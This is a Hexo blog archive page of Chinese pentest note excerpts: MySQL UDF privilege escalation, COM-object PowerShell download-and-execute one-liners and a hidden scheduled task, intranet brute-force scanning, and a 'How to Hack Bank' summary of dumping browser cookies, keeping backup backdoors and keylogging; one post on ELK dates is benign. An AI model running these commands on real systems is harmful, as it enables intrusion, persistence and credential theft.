@@ -1,0 +1,757 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 3 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-29  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
+</blockquote>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
+<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
+show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>结果如下:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
++----------------------+---------------------------+
+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
++----------------------+---------------------------+
+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
++-------------------------+--------+
+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
++-------------------------+--------+
+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
+<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
++-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
+<p>可以在开启mysql的时候设置plugin的目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">指定目录:
+mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\
+
+指定配置文件:
+mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini
+
+配置文件包括如下内容:
+[mysqld]
+plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
+	
+	</div>
+  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-07-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
+</blockquote>
+<p>我就瞎写了:</p>
+<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
+$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
+powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
+$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
+$Instance.Connect()
+$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
+$Task &#x3D; $Instance.NewTask(0)
+$Trigger &#x3D; $Task.triggers.Create(0)
+$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
+$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
+$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
+$Trigger.Enabled &#x3D; $True
+$Trigger.Id &#x3D; $Taskname
+$Action &#x3D; $Task.Actions.Create(0)
+$Action.Path &#x3D; “cmd.exe”
+$Action.Arguments &#x3D; “&#x2F;c whoami”
+$Action.HideAppWindow &#x3D; $True
+$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
+
+function Convert-Date &#123;       
+
+        param(
+             [datetime]$Date
+
+        )       
+
+        PROCESS &#123;
+               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
+        &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/05/14/workgroup-pentest2.html" >内网渗透流水账</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-14  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol>
+<li>Linux主机www权限</li>
+<li>主机无法出外网</li>
+<li>正向代理无法使用</li>
+<li>B段内网</li>
+</ol>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p>
+<pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等
+PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的
+
+python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p>
+<pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号
+使用scan查看keys: scan 0 match * count 100 
+查看类型: type &lt;key&gt;
+hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windows下可以先测试是否可写入插件目录:</p>
+	
+	</div>
+  <a type="button" href="/2020/05/14/workgroup-pentest2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/05/06/python-elk.html" >Python处理xlsx到ELK</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-05-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需要把数据从xlsx读到elk，再做数据分析，遇到一个问题是把当在elk里面处理日期类的数据的时候，需要把数据转换为Date类型:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">float2utc</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">(</span><span class="token operator">*</span>xldate_as_tuple<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	local <span class="token operator">=</span> pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span>
+	local_dt <span class="token operator">=</span> local<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>date<span class="token punctuation">,</span> is_dst<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+	utc_dt <span class="token operator">=</span> local_dt<span class="token punctuation">.</span>astimezone<span class="token punctuation">(</span>pytz<span class="token punctuation">.</span>utc<span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>utc_dt<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%f"</span><span class="token punctuation">)</span>
+	timeStr <span class="token operator">=</span> timeStr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
+	<span class="token comment">#cell = date.strftime('%Y/%m/%d %H:%M')</span>
+	<span class="token keyword">return</span> timeStr <span class="token operator">+</span> <span class="token string">"Z"</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon">https://stackoverflow.com/questions/40294803/datetime-in-elasticsearch-how-to-handle-timezon</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2020/05/06/python-elk.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/04/22/how-to-hack-bank.html" >How to Hack Bank</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-04-22  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
+</blockquote>
+<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
+strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
+findstr PHPSESSID * .dmp&gt; tmp
+strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
+<li>常用的操作用一个后门</li>
+<li>留一个备用的后门，第一个失效之后启用</li>
+</ol>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
+<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
+post&#x2F;windows&#x2F;gather&#x2F;screen_spy
+
+再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
+
+
+使用Windows自带的PSR截屏：
+psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
+Start-Sleep -s 20;
+psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
+realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
+all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
+living that way. So I began to spend more time away from my computer, with other people, 
+learning to open myself to the world, to feel my emotions, to connect with others, to accept 
+risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is 
+more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on 
+my way.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/04/22/how-to-hack-bank.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[Thread-Phineas-Phisher-Hack-Back-Bank]<a target="_blank" rel="noopener" href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
+</blockquote>
+<h3 id="从浏览器dump登陆Cookie"><a href="#从浏览器dump登陆Cookie" class="headerlink" title="从浏览器dump登陆Cookie"></a>从浏览器dump登陆Cookie</h3><pre class="line-numbers language-none"><code class="language-none">procdump64 &#x2F;accepteula -r -ma PID_of_browser
+strings64 &#x2F;accepteula * .dmp | findstr PHPSESSID 2&gt; nul
+findstr PHPSESSID * .dmp&gt; tmp
+strings64 &#x2F;accepteula tmp | findstr PHPSESSID 2&gt; nul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="准备后路"><a href="#准备后路" class="headerlink" title="准备后路"></a>准备后路</h3><ol>
+<li>常用的操作用一个后门</li>
+<li>留一个备用的后门，第一个失效之后启用</li>
+</ol>
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>用到一下模块:</p>
+<pre class="line-numbers language-none"><code class="language-none">MSF每5s截屏:
+post&#x2F;windows&#x2F;gather&#x2F;screen_spy
+
+再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。
+
+
+使用Windows自带的PSR截屏：
+psr.exe &#x2F;start &#x2F;gui 0 &#x2F;output C:\Users\Dan\Desktop\cool.zip;
+Start-Sleep -s 20;
+psr.exe &#x2F;stop;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><pre class="line-numbers language-none"><code class="language-none">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I
+realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at 
+all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue 
+living that way. So I began to spend more time away from my computer, with other people, 
+learning to open myself to the world, to feel my emotions, to connect with others, to accept 
